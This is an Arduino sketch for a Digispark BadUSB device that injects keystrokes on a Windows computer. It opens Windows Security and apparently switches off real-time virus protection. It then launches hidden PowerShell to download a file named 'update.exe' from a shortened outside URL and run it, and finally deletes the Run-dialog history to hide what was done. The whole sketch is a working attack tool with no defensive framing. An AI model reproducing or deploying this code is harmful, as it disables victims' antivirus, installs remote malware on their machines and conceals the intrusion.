#include "DigiKeyboard.h"
 
void setup() {
// don't need to set anything up to use DigiKeyboard
}
 
void loop() {
  
DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT  ); // press the windows key
DigiKeyboard.delay(1000); // wait a second
DigiKeyboard.print("virus & threat protection");
DigiKeyboard.delay(1000); // wait a second
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000); 
DigiKeyboard.sendKeyStroke(43);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(43);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(43);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(43);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
DigiKeyboard.delay(3000); // wait a second
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(3000);

// DigiKeyboard.println("powershell.exe Start-Process powershell -Verb runAs");  for Administrator user
// DigiKeyboard.delay(2000);
// DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);

DigiKeyboard.println("powershell.exe  -windowstyle hidden");
DigiKeyboard.delay(5000);
DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'https://rb.gy/niwt7j'; $file = 'update.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(2000);
DigiKeyboard.println("reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
for(;;){ /*empty*/ }


}
